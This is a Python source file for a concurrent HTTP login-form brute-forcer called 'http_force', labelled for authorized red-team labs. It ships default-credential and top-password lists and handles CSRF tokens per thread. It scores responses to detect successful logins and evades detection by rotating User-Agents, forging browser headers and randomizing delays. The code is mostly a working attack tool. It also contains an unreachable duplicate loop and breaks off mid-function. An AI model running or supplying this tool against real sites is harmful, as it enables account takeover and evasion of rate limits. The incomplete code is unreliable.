#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
http_force v3.2
HTTP login form brute-forcer for authorized red team lab use.

Usage:
    python http_force.py -u http://target/login users.txt passwords.txt
    python http_force.py -u http://target/login combos.txt --combo --threads 20 --follow

Features:
    - Sequential and concurrent (thread-safe) attack modes
    - Per-thread HTTP sessions and CSRF tokens (no false positives)
    - HTTP status gating: 4xx/5xx never score as success
    - Score-based response analysis (status, length, hash, cookies, keywords)
    - Rotating User-Agents and realistic browser headers
    - Auto-throttling on consecutive errors
    - 2FA/MFA detection
    - Rate-limit / block detection
    - Priority ordering of credentials
    - Results saved to JSON

Requirements:
    pip install requests beautifulsoup4 urllib3
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import random
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Set, Any
from urllib.parse import urljoin
import warnings

import requests
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

warnings.filterwarnings('ignore', message='Unverified HTTPS request')


class HttpMethod(Enum):
    GET = "get"
    POST = "post"


class LogLevel(Enum):
    DEBUG = logging.DEBUG
    INFO = logging.INFO
    WARNING = logging.WARNING
    ERROR = logging.ERROR
    CRITICAL = logging.CRITICAL


USER_AGENTS_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
]

REALISTIC_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "DNT": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Sec-CH-UA": '"Not_A Brand";v="8", "Chromium";v="120"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
}

HIGH_PRIORITY_COMBOS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("root", "root"), ("root", "toor"),
    ("administrator", "administrator"), ("user", "user"),
    ("guest", "guest"), ("test", "test"), ("admin", ""), ("root", ""),
]

TOP_PASSWORDS = [
    "password", "123456", "123456789", "12345678", "12345", "1234567",
    "admin", "password123", "qwerty", "abc123", "letmein", "welcome",
    "monkey", "dragon", "master", "123123", "1234", "admin123", "root", "pass",
]

DEFAULT_CONFIG = {
    "user_agent": "ROTATING",
    "timeout": 10,
    "max_retries": 3,
    "backoff_factor": 0.3,
    "delay_between_attempts": 0.5,
    "delay_randomization": 0.3,
    "max_workers": 5,
    "verify_ssl": True,
    "follow_redirects": True,
    "rotate_user_agents": True,
    "use_realistic_headers": True,
    "randomize_delays": True,
    "session_persistence": True,
    "enable_auto_throttling": True,
    "rate_limit_detection": True,
    "consecutive_errors_threshold": 5,
    "throttle_backoff_multiplier": 2.0,
    "score_thresholds": {
        "status_change": 2,
        "length_change": 2,
        "hash_change": 2,
        "cookies_change": 3,
        "success_keywords": 5,
        "fail_keywords": -5,
        "login_form_present": -10,
        "min_success_score": 4,
    },
}


class RegexPatterns:
    """Pre-compiled regex patterns. All patterns are compiled once at import time and are thread-safe."""

    USERNAME_FIELD = re.compile(
        r'\b(?:user(?:_?name)?|login(?:_?name)?|email(?:_?addr(?:ess)?)?'
        r'|account(?:_?name)?|userid|uid|usr|usuario|correo|identificador)\b',
        re.IGNORECASE,
    )

    PASSWORD_FIELD = re.compile(
        r'\b(?:pass(?:word|wd|code|phrase)?|pwd|clave|contrase[ñn]a|secret|pin)\b',
        re.IGNORECASE,
    )

    CSRF_FIELD = re.compile(
        r'\b(?:csrf[_\-]?token|_token|authenticity[_\-]?token'
        r'|__requestverificationtoken|nonce|_wpnonce|form[_\-]?token)\b',
        re.IGNORECASE,
    )

    SUCCESS_PATTERN = re.compile(
        r'\b(?:dashboard|logout|sign[\s\-]?out|log[\s\-]?out'
        r'|bienvenid[oa]|welcome(?:\s+back)?|profile|my[\s\-]?account'
        r'|admin[\s\-]?panel|panel[\s\-]?de[\s\-]?control'
        r'|signed[\s\-]?in|logged[\s\-]?in|login[\s\-]?successful'
        r'|successfully[\s\-]?authenticated|access[\s\-]?granted)\b',
        re.IGNORECASE,
    )

    FAIL_PATTERN = re.compile(
        r'\b(?:invalid[\s\-]?(?:user(?:name)?|password|credentials?)'
        r'|incorrect[\s\-]?(?:user(?:name)?|password)'
        r'|wrong[\s\-]?(?:user(?:name)?|password)'
        r'|(?:login|auth(?:entication)?)[\s\-]?(?:failed?|error|denied)'
        r'|bad[\s\-]?credentials?|unauthorized|access[\s\-]?denied'
        r'|contrase[ñn]a[\s\-]?incorrecta|usuario[\s\-]?incorrecto'
        r'|try[\s\-]?again|too[\s\-]?many[\s\-]?attempts?)\b',
        re.IGNORECASE,
    )

    BLOCK_PATTERN = re.compile(
        r'\b(?:rate[\s\-]?limit(?:ed)?|too[\s\-]?many[\s\-]?requests?'
        r'|(?:account|ip)[\s\-]?(?:blocked|banned|locked|suspended)'
        r'|captcha|recaptcha|hcaptcha'
        r'|temporarily[\s\-]?(?:locked|unavailable|blocked)'
        r'|suspicious[\s\-]?activity|abuse[\s\-]?detected'
        r'|rate[\s\-]?exceeded|slow[\s\-]?down)\b',
        re.IGNORECASE,
    )

    MFA_PATTERN = re.compile(
        r'\b(?:two[\s\-]?(?:factor|step)[\s\-]?auth(?:entication)?'
        r'|2fa|mfa|otp|one[\s\-]?time[\s\-]?(?:password|code|token)'
        r'|verification[\s\-]?code|authenticator|totp)\b',
        re.IGNORECASE,
    )

    META_REFRESH = re.compile(
        r'<meta[^>]+http-equiv=["\']refresh["\'][^>]+content=["\']'
        r'\d+;\s*url=([^"\'>\s]+)',
        re.IGNORECASE,
    )

    JS_REDIRECT = re.compile(
        r'(?:window|document|top|self|parent)\s*\.\s*location'
        r'(?:\s*\.\s*(?:href|replace|assign))?\s*=\s*["\']([^"\']+)["\']',
        re.IGNORECASE,
    )

    AUTHENTICATED_PATH = re.compile(
        r'/(dashboard|admin|panel|home|account|profile|portal'
        r'|welcome|inicio|inicio[-_]sesion|mi[-_]cuenta|perfil)',
        re.IGNORECASE,
    )

    EMAIL = re.compile(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$')

    URL = re.compile(r'^https?://[^\s/$.?#].[^\s]*$', re.IGNORECASE)


@dataclass
class FormData:
    """Parsed login form metadata extracted from the target page."""
    action_url: str
    method: HttpMethod
    username_field: Optional[str] = None
    password_field: Optional[str] = None
    hidden_fields: Dict[str, str] = field(default_factory=dict)
    csrf_tokens: Dict[str, str] = field(default_factory=dict)

    def is_valid(self) -> bool:
        return bool(self.username_field and self.password_field)


@dataclass
class Credential:
    """A username/password pair with an optional priority score."""
    username: str
    password: str
    priority: int = 0

    def __str__(self) -> str:
        return f"{self.username}:{self.password}"

    def __hash__(self):
        return hash((self.username, self.password))

    def __eq__(self, other):
        if not isinstance(other, Credential):
            return False
        return self.username == other.username and self.password == other.password


@dataclass
class AttemptResult:
    """Result of a single authentication attempt."""
    credential: Credential
    success: bool
    status_code: int
    response_length: int
    response_hash: str
    cookies: Dict[str, str]
    elapsed_time: float
    score: int
    timestamp: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    redirect_location: Optional[str] = None
    error_message: Optional[str] = None
    is_blocked: bool = False
    has_mfa: bool = False

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d['credential'] = str(self.credential)
        d['timestamp'] = self.timestamp.isoformat()
        return d


@dataclass
class AttackStatistics:
    """Running counters for the current attack."""
    total_attempts: int = 0
    successful_attempts: int = 0
    failed_attempts: int = 0
    errors: int = 0
    blocked_attempts: int = 0
    consecutive_errors: int = 0
    current_delay: float = 0.5
    start_time: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    end_time: Optional[datetime] = None
    tested_credentials: Set[str] = field(default_factory=set)

    def add_attempt(self, result: AttemptResult):
        self.total_attempts += 1
        if result.success:
            self.successful_attempts += 1
            self.consecutive_errors = 0
        else:
            self.failed_attempts += 1

        if result.error_message:
            self.errors += 1
            self.consecutive_errors += 1
        else:
            self.consecutive_errors = 0

        if result.is_blocked:
            self.blocked_attempts += 1

        self.tested_credentials.add(str(result.credential))

    def get_duration(self) -> float:
        end = self.end_time or datetime.now(timezone.utc)
        return (end - self.start_time).total_seconds()

    def get_rate(self) -> float:
        duration = self.get_duration()
        return self.total_attempts / duration if duration > 0 else 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            'total_attempts': self.total_attempts,
            'successful': self.successful_attempts,
            'failed': self.failed_attempts,
            'errors': self.errors,
            'blocked': self.blocked_attempts,
            'duration_seconds': self.get_duration(),
            'rate_per_second': self.get_rate(),
            'start_time': self.start_time.isoformat(),
            'end_time': self.end_time.isoformat() if self.end_time else None,
        }


class ColoredFormatter(logging.Formatter):
    """Logging formatter that adds ANSI color codes by level."""

    COLORS = {
        'DEBUG': '\033[36m',
        'INFO': '\033[32m',
        'WARNING': '\033[33m',
        'ERROR': '\033[31m',
        'CRITICAL': '\033[35m',
        'RESET': '\033[0m',
    }

    def format(self, record):
        color = self.COLORS.get(record.levelname, self.COLORS['RESET'])
        record.levelname = f"{color}{record.levelname}{self.COLORS['RESET']}"
        return super().format(record)


def setup_logger(name: str, level: LogLevel = LogLevel.INFO,
                 log_file: Optional[Path] = None) -> logging.Logger:
    """Creates and returns a logger with colored console output and optional file handler."""
    logger = logging.getLogger(name)
    logger.setLevel(level.value)
    logger.handlers.clear()

    console = logging.StreamHandler(sys.stdout)
    console.setLevel(level.value)
    console.setFormatter(ColoredFormatter('%(asctime)s | %(levelname)s | %(message)s',
                                          datefmt='%Y-%m-%d %H:%M:%S'))
    logger.addHandler(console)

    if log_file:
        fh = logging.FileHandler(log_file, encoding='utf-8')
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(name)s | %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
        ))
        logger.addHandler(fh)

    return logger


def load_config(config_path: Optional[Path] = None) -> Dict[str, Any]:
    """Returns DEFAULT_CONFIG merged with an optional JSON override file."""
    config = DEFAULT_CONFIG.copy()
    if config_path and config_path.exists():
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                config.update(json.load(f))
        except Exception as e:
            print(f"[!] Error loading config: {e}. Using defaults.")
    return config


def get_random_user_agent() -> str:
    return random.choice(USER_AGENTS_POOL)


def get_random_delay(base: float, randomization: float = 0.3) -> float:
    """Returns base ± randomization% as a uniform random value."""
    return random.uniform(base * (1 - randomization), base * (1 + randomization))


class CredentialOrganizer:
    """Sorts credentials by estimated probability of success."""

    def __init__(self, logger: logging.Logger):
        self.logger = logger

    def prioritize_credentials(self, credentials: List[Credential]) -> List[Credential]:
        """
        Splits credentials into three buckets and returns them in order:
        known high-value combos first, then common users/passwords, then the rest.
        The medium and low buckets are shuffled to avoid predictable patterns.
        """
        high, medium, low = [], [], []

        high_set = {(u.lower(), p.lower()) for u, p in HIGH_PRIORITY_COMBOS}
        common_users = {"admin", "root", "administrator", "user"}

        for cred in credentials:
            if (cred.username.lower(), cred.password.lower()) in high_set:
                cred.priority = 100
                high.append(cred)
            elif cred.password in TOP_PASSWORDS or cred.username in common_users:
                cred.priority = 50
                medium.append(cred)
            else:
                cred.priority = 10
                low.append(cred)

        random.shuffle(medium)
        random.shuffle(low)

        self.logger.info("[+] Credenciales ordenadas:")
        self.logger.info(f"   Alta prioridad:  {len(high)}")
        self.logger.info(f"   Media prioridad: {len(medium)}")
        self.logger.info(f"   Baja prioridad:  {len(low)}")

        return high + medium + low


class CredentialLoader:
    """Loads credentials from text files and generates user×password combinations."""

    def __init__(self, logger: logging.Logger):
        self.logger = logger
        self.organizer = CredentialOrganizer(logger)

    def load_from_file(self, filepath: Path) -> List[str]:
        """Reads non-empty, non-comment lines from a file."""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                items = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            self.logger.info(f"Cargados {len(items)} items desde {filepath.name}")
            return items
        except FileNotFoundError:
            self.logger.error(f"Archivo no encontrado: {filepath}")
            return []
        except Exception as e:
            self.logger.error(f"Error leyendo {filepath}: {e}")
            return []

    def load_combos(self, filepath: Path) -> List[Credential]:
        """Parses a file of user:pass lines into a prioritized credential list."""
        credentials = []
        for line in self.load_from_file(filepath):
            if ':' in line:
                parts = line.split(':', 1)
                credentials.append(Credential(parts[0], parts[1]))
        return self.organizer.prioritize_credentials(credentials)

    def generate_credentials(self, usernames: List[str],
                              passwords: List[str]) -> List[Credential]:
        """Builds all user×password combinations and applies priority ordering."""
        credentials = [Credential(u, p) for u in usernames for p in passwords]
        self.logger.info(
            f"Generadas {len(credentials)} combinaciones "
            f"({len(usernames)} users × {len(passwords)} passwords)"
        )
        return self.organizer.prioritize_credentials(credentials)


class FormAnalyzer:
    """Parses HTML pages to locate and extract login form fields."""

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.config = config
        self.logger = logger

    def find_login_form(self, html: str, base_url: str) -> Optional[FormData]:
        """Returns the first valid login form found in the HTML, or None."""
        try:
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form'):
                fd = self._analyze_form(form, base_url)
                if fd and fd.is_valid():
                    return fd
        except Exception as e:
            self.logger.error(f"Error analizando formulario: {e}")
        return None

    def _analyze_form(self, form, base_url: str) -> Optional[FormData]:
        """Extracts action URL, method, and field names from a single <form> element."""
        try:
            action = form.get('action', '')
            action_url = urljoin(base_url, action) if action else base_url
            method = HttpMethod.POST if form.get('method', 'post').lower() == 'post' else HttpMethod.GET
            fd = FormData(action_url=action_url, method=method)

            for inp in form.find_all('input'):
                name = inp.get('name', '')
                kind = inp.get('type', 'text').lower()
                value = inp.get('value', '')

                if not name:
                    continue

                if RegexPatterns.CSRF_FIELD.search(name):
                    fd.hidden_fields[name] = value
                    fd.csrf_tokens[name] = value
                    self.logger.debug(f"CSRF token encontrado: {name}")
                elif kind == 'password' or RegexPatterns.PASSWORD_FIELD.search(name):
                    fd.password_field = name
                    self.logger.debug(f"Campo password encontrado: {name}")
                elif RegexPatterns.USERNAME_FIELD.search(name):
                    fd.username_field = name
                    self.logger.debug(f"Campo usuario encontrado: {name}")
                elif kind == 'hidden':
                    fd.hidden_fields[name] = value

            return fd
        except Exception as e:
            self.logger.error(f"Error en _analyze_form: {e}")
            return None


class EvasiveHttpClient:
    """
    HTTP client with evasion techniques.

    Each thread gets its own requests.Session via threading.local().
    This prevents session cookies from leaking between threads,
    which would cause false positives when one thread logs in successfully.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.config = config
        self.logger = logger
        self._local = threading.local()

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        retry = Retry(
            total=self.config['max_retries'],
            backoff_factor=self.config['backoff_factor'],
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"],
        )
        adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=20)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def _get_session(self) -> requests.Session:
        """Returns the session belonging to the calling thread, creating it if needed."""
        if not hasattr(self._local, 'session'):
            self._local.session = self._create_session()
        return self._local.session

    def get_headers(self) -> Dict[str, str]:
        headers = REALISTIC_HEADERS.copy() if self.config.get('use_realistic_headers', True) else {}
        if self.config.get('rotate_user_agents', True):
            headers['User-Agent'] = get_random_user_agent()
        else:
            ua = self.config.get('user_agent', USER_AGENTS_POOL[0])
            headers['User-Agent'] = ua if ua != "ROTATING" else get_random_user_agent()
        return headers

    def request(self, method: str, url: str, **kwargs) -> requests.Response:
        headers = self.get_headers()
        if 'headers' in kwargs:
            headers.update(kwargs['headers'])
        kwargs['headers'] = headers
        kwargs.setdefault('verify', self.config.get('verify_ssl', True))
        kwargs.setdefault('timeout', self.config.get('timeout', 10))
        kwargs.setdefault('allow_redirects', self.config.get('follow_redirects', True))
        return self._get_session().request(method, url, **kwargs)

    def close(self):
        if hasattr(self._local, 'session'):
            self._local.session.close()
            del self._local.session


class ResponseAnalyzer:
    """
    Scores HTTP responses to decide whether a login attempt succeeded.

    Scoring is based on deviations from a baseline (captured before the attack):
    status code change, body length/hash change, new cookies, keyword presence,
    disappearance of the login form, and post-login URL path.

    Hard gates applied before scoring:
    - HTTP 429  → rate-limit, stop attack
    - HTTP 403/405/406/423/451 → definitive reject, score -50
    - HTTP 5xx  → server error, score -10
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.config = config
        self.logger = logger
        self.baseline_response = None

    def set_baseline(self, response: requests.Response):
        """Captures the unauthenticated page state for later comparison."""
        self.baseline_response = {
            'status': response.status_code,
            'length': len(response.text),
            'hash': hashlib.md5(response.text.encode()).hexdigest(),
            'cookies': len(response.cookies),
            'has_login_form': self._has_login_form(response.text),
        }
        self.logger.debug(f"Baseline establecido: {self.baseline_response}")

    def _has_login_form(self, html: str) -> bool:
        try:
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form'):
                if any(i.get('type', '').lower() == 'password' for i in form.find_all('input')):
                    return True
        except Exception:
            pass
        return False

    def _check_redirect_success(self, response: requests.Response) -> bool:
        """Returns True if the final URL after redirects looks like an authenticated area."""
        return bool(RegexPatterns.AUTHENTICATED_PATH.search(response.url))

    def analyze_response(self, response: requests.Response,
                         elapsed: float) -> Tuple[int, bool, bool]:
        """
        Returns (score, is_blocked, has_mfa).
        A score >= config['score_thresholds']['min_success_score'] is treated as success.
        """
        score = 0
        status = response.status_code
        text = response.text

        if status == 429:
            self.logger.warning("[!] RATE LIMIT detectado (HTTP 429)")
            return -100, True, False

        if status in (403, 405, 406, 423, 451):
            self.logger.debug(f"HTTP {status} → fallo definitivo")
            return -50, False, False

        if status >= 500:
            self.logger.debug(f"HTTP {status} → error de servidor")
            return -10, False, False

        if RegexPatterns.BLOCK_PATTERN.search(text):
            kw = RegexPatterns.BLOCK_PATTERN.search(text).group(0)
            self.logger.warning(f"[!] BLOQUEO DETECTADO: '{kw}'")
            return -100, True, False

        has_mfa = bool(RegexPatterns.MFA_PATTERN.search(text))
        if has_mfa:
            self.logger.info("[~] 2FA/MFA detectado")

        th = self.config['score_thresholds']

        if self.baseline_response:
            if status != self.baseline_response['status']:
                score += th['status_change']

            cur_len = len(text)
            base_len = self.baseline_response['length']
            if abs(cur_len - base_len) > base_len * 0.1:
                score += th['length_change']

            if hashlib.md5(text.encode()).hexdigest() != self.baseline_response['hash']:
                score += th['hash_change']

            if len(response.cookies) > self.baseline_response['cookies']:
                score += th['cookies_change']

            has_form_now = self._has_login_form(text)
            if self.baseline_response['has_login_form'] and not has_form_now:
                score += abs(th['login_form_present'])
            elif has_form_now:
                score += th['login_form_present']

        success_hits = RegexPatterns.SUCCESS_PATTERN.findall(text)
        if success_hits:
            score += th['success_keywords'] * len(success_hits)

        fail_hits = RegexPatterns.FAIL_PATTERN.findall(text)
        if fail_hits:
            score += th['fail_keywords'] * len(fail_hits)

        if self._check_redirect_success(response):
            score += 3

        if has_mfa:
            score += 6

        return score, False, has_mfa


class BruteForceEngine:
    """
    Orchestrates the brute-force attack in sequential or concurrent mode.

    Thread-safety notes:
    - _stats_lock protects AttackStatistics and found_credentials (concurrent writes).
    - _csrf_lock protects reads of shared FormData fields.
    - Each thread fetches its own CSRF token with its own HTTP session
      (_get_thread_form_data), so tokens are never shared between threads.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.config = config
        self.logger = logger
        self.http_client = EvasiveHttpClient(config, logger)
        self.form_analyzer = FormAnalyzer(config, logger)
        self.response_analyzer = ResponseAnalyzer(config, logger)
        self.credential_loader = CredentialLoader(logger)

        self.target_url: Optional[str] = None
        self.form_data: Optional[FormData] = None
        self.statistics = AttackStatistics()
        self.statistics.current_delay = config['delay_between_attempts']

        self.found_credentials: List[AttemptResult] = []
        self.stop_attack = False

        self._stats_lock = threading.Lock()
        self._csrf_lock = threading.Lock()

    def initialize_target(self, url: str) -> bool:
        """GETs the target URL, captures baseline, and extracts form metadata."""
        self.logger.info(f"Inicializando objetivo: {url}")
        self.target_url = url
        try:
            response = self.http_client.request('GET', url)
            self.response_analyzer.set_baseline(response)
            self.form_data = self.form_analyzer.find_login_form(response.text, url)

            if not self.form_data:
                self.logger.error("No se encontró formulario de login")
                return False
            if not self.form_data.is_valid():
                self.logger.error("Formulario encontrado pero faltan campos necesarios")
                return False

            self.logger.info("✓ Objetivo inicializado")
            self.logger.info(f"   Action URL:     {self.form_data.action_url}")
            self.logger.info(f"   Método:         {self.form_data.method.value.upper()}")
            self.logger.info(f"   Campo usuario:  {self.form_data.username_field}")
            self.logger.info(f"   Campo password: {self.form_data.password_field}")
            self.logger.info(f"   Campos hidden:  {len(self.form_data.hidden_fields)}")
            self.logger.info(f"   CSRF tokens:    {list(self.form_data.csrf_tokens.keys())}")
            return True
        except Exception as e:
            self.logger.error(f"Error inicializando objetivo: {e}")
            return False

    def _get_thread_form_data(self) -> Tuple[Dict, Dict, str, str, str, HttpMethod]:
        """
        Returns a local copy of form metadata plus a fresh CSRF token fetched
        by this thread's own HTTP session.

        Because CSRF tokens are bound to the server-side session, each thread
        must obtain its own token using its own session (threading.local).
        The shared self.form_data structure is never written to here.

        Returns:
            (hidden_fields, csrf_tokens, username_field, password_field, action_url, method)
        """
        with self._csrf_lock:
            username_field = self.form_data.username_field
            password_field = self.form_data.password_field
            action_url = self.form_data.action_url
            method = self.form_data.method
            has_csrf = bool(self.form_data.csrf_tokens)
            base_hidden = self.form_data.hidden_fields.copy()

        if not has_csrf:
            return base_hidden, {}, username_field, password_field, action_url, method

        try:
            resp = self.http_client.request('GET', self.target_url)
            new_form = self.form_analyzer.find_login_form(resp.text, self.target_url)
            if new_form and new_form.csrf_tokens:
                self.logger.debug(
                    f"[{threading.current_thread().name}] "
                    f"CSRF token obtenido: {list(new_form.csrf_tokens.keys())}"
                )
                return (
                    new_form.hidden_fields.copy(),
                    new_form.csrf_tokens,
                    username_field, password_field, action_url, method,
                )
        except Exception as e:
            self.logger.warning(f"Error obteniendo CSRF por thread: {e}")

        return base_hidden, {}, username_field, password_field, action_url, method

    def _apply_auto_throttling(self):
        """Doubles the delay after too many consecutive errors. Call inside _stats_lock."""
        if not self.config.get('enable_auto_throttling', True):
            return
        threshold = self.config.get('consecutive_errors_threshold', 5)
        if self.statistics.consecutive_errors >= threshold:
            old = self.statistics.current_delay
            self.statistics.current_delay *= self.config.get('throttle_backoff_multiplier', 2.0)
            self.logger.warning(
                f"[!] AUTO-THROTTLING: {self.statistics.consecutive_errors} errores. "
                f"Delay: {old:.2f}s → {self.statistics.current_delay:.2f}s"
            )
            self.statistics.consecutive_errors = 0

    def try_credential(self, credential: Credential) -> AttemptResult:
        """
        Submits a single credential to the login form and scores the response.
        Obtains its own CSRF token via _get_thread_form_data (thread-safe).
        """
        start = time.time()
        try:
            hidden, csrf, user_field, pass_field, action_url, method = \
                self._get_thread_form_data()

            data = hidden.copy()
            data.update(csrf)
            data[user_field] = credential.username
            data[pass_field] = credential.password

            if method == HttpMethod.POST:
                response = self.http_client.request('POST', action_url, data=data)
            else:
                response = self.http_client.request('GET', action_url, params=data)

            elapsed = time.time() - start
            score, is_blocked, has_mfa = self.response_analyzer.analyze_response(response, elapsed)
            success = score >= self.config['score_thresholds']['min_success_score']

            return AttemptResult(
                credential=credential,
                success=success,
                status_code=response.status_code,
                response_length=len(response.text),
                response_hash=hashlib.md5(response.text.encode()).hexdigest(),
                cookies=dict(response.cookies),
                elapsed_time=elapsed,
                score=score,
                redirect_location=response.url if response.url != action_url else None,
                is_blocked=is_blocked,
                has_mfa=has_mfa,
            )

        except Exception as e:
            elapsed = time.time() - start
            self.logger.error(f"Error probando {credential}: {e}")
            return AttemptResult(
                credential=credential, success=False, status_code=0,
                response_length=0, response_hash="", cookies={},
                elapsed_time=elapsed, score=-100, error_message=str(e),
            )

    def run_attack_sequential(self, credentials: List[Credential],
                              follow_mode: bool = False) -> Optional[AttemptResult]:
        """
        Tries credentials one at a time.
        Stops at the first success unless follow_mode is True,
        in which case it exhausts all credentials and returns the first success found.
        """
        self.logger.info(f"Iniciando ataque secuencial con {len(credentials)} credenciales")
        if follow_mode:
            self.logger.info("[+] Modo FOLLOW activado - buscará TODAS las credenciales válidas")

        first_success = None

        for i, cred in enumerate(credentials, 1):
            if self.stop_attack:
                break

            self.logger.info(f"[{i}/{len(credentials)}] Probando: {cred}")
            result = self.try_credential(cred)
            self.statistics.add_attempt(result)

            if result.success:
                self.logger.info(f"[+] ¡CREDENCIALES VÁLIDAS! {cred}")
                self.logger.info(f"   Score:   {result.score}")
                self.logger.info(f"   Status:  {result.status_code}")
                self.logger.info(f"   Cookies: {len(result.cookies)}")
                if result.has_mfa:
                    self.logger.warning("   [!] 2FA/MFA detectado - acceso parcial")

                self.found_credentials.append(result)
                self._save_individual_credential(result)

                if not first_success:
                    first_success = result

                if not follow_mode:
                    return result

            elif result.is_blocked:
                self.logger.error("[X] BLOQUEO DETECTADO - Deteniendo ataque")
                self.stop_attack = True
                break

            self._apply_auto_throttling()

            if i < len(credentials):
                delay = (
                    get_random_delay(self.statistics.current_delay,
                                     self.config.get('delay_randomization', 0.3))
                    if self.config.get('randomize_delays', True)
                    else self.statistics.current_delay
                )
                time.sleep(delay)

        return first_success

        for i, cred in enumerate(credentials, 1):
            if self.stop_attack:
                break

            self.logger.info(f"[{i}/{len(credentials)}] Probando: {cred}")
            result = self.try_credential(cred)
            self.statistics.add_attempt(result)

            if result.success:
                self.logger.info(f"[+] ¡CREDENCIALES VÁLIDAS! {cred}")
                self.logger.info(f"   Score:   {result.score}")
                self.logger.info(f"   Status:  {result.status_code}")
                self.logger.info(f"   Cookies: {len(result.cookies)}")
                if result.has_mfa:
                    self.logger.warning("   [!] 2FA/MFA detectado - acceso parcial")
                self.found_credentials.append(result)
                self._save_individual_credential(result)
                return result

            elif result.is_blocked:
                self.logger.error("[X] BLOQUEO DETECTADO - Deteniendo ataque")
                self.stop_attack = True
                break

            self._apply_auto_throttling()

            if i < len(credentials):
                delay = (
                    get_random_delay(self.statistics.current_delay,
                                     self.config.get('delay_randomization', 0.3))
                    if self.config.get('randomize_delays', True)
                    else self.statistics.current_delay
                )
                time.sleep(delay)

        return None

    def run_attack_concurrent(self, credentials: List[Credential],
                              max_workers: int,
                              follow_mode: bool = False) -> Optional[AttemptResult]:
        """
        Submits all credentials to a thread pool and processes results as they complete.

        All writes to shared state (statistics, found_credentials, stop_attack)
        happen inside _stats_lock. Logging occurs outside the lock.
        When follow_mode is False the attack stops at the first success.
        """
        self.logger.info(
            f"Iniciando ataque concurrente con {len(credentials)} credenciales "
            f"usando {max_workers} threads"
        )
        if follow_mode:
            self.logger.info("[+] Modo FOLLOW activado - buscará TODAS las credenciales válidas")

        first_success = None

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {
                executor.submit(self._try_with_delay, cred, i, len(credentials)): cred
                for i, cred in enumerate(credentials, 1)
            }

            for future in as_completed(futures):
                if self.stop_attack and not follow_mode:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break

                try:
                    result = future.result()

                    with self._stats_lock:
                        self.statistics.add_attempt(result)
                        self._apply_auto_throttling()

                        if result.success:
                            self.found_credentials.append(result)
                            self._save_individual_credential(result)
                            if not first_success:
                                first_success = result
                            if not follow_mode:
                                self.stop_attack = True

                        elif result.is_blocked:
                            self.stop_attack = True

                    if result.success:
                        self.logger.info(f"[+] ¡CREDENCIALES VÁLIDAS! {result.credential}")
                        self.logger.info(f"   Score:   {result.score}")
                        self.logger.info(f"   Status:  {result.status_code}")
                        if result.has_mfa:
                            self.logger.warning("   [!] 2FA/MFA detectado - acceso parcial")
                        if not follow_mode:
                            self.logger.info("✓ Primera credencial encontrada - deteniendo ataque")

                    elif result.is_blocked:
                        self.logger.error("[X] BLOQUEO DETECTADO - deteniendo ataque")
